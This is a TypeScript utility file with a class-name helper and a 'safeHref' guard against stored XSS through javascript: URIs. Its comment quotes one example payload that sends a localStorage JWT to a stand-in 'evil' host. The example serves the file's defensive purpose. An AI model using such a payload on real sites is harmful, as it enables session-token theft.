import { clsx, type ClassValue } from "clsx";
import { twMerge } from "tailwind-merge";

export function cn(...inputs: ClassValue[]) {
  return twMerge(clsx(inputs));
}

/**
 * URL-scheme guard for user/tenant-supplied values rendered into an
 * `href` attribute (security finding FE-01 — stored XSS via `javascript:` URIs).
 *
 * React escapes text content but does NOT sanitize `href` values, so a stored
 * value such as `javascript:fetch('//evil/?t='+localStorage['kmosf.jwt'])`
 * executes script in the admin origin when the link is clicked. This guard
 * returns the URL only when it uses an http(s) scheme; anything else
 * (javascript:, data:, vbscript:, relative-without-scheme, etc.) yields
 * `undefined`, which makes the anchor inert (no navigation target).
 *
 * Apply to EVERY `href={<data>}` that renders user- or tenant-supplied data.
 * Do NOT use it on app-internal API-path builders or relative links — those
 * are already safe and would be needlessly stripped.
 */
export function safeHref(url?: string | null): string | undefined {
  if (typeof url !== "string") return undefined;
  return /^https?:\/\//i.test(url.trim()) ? url : undefined;
}
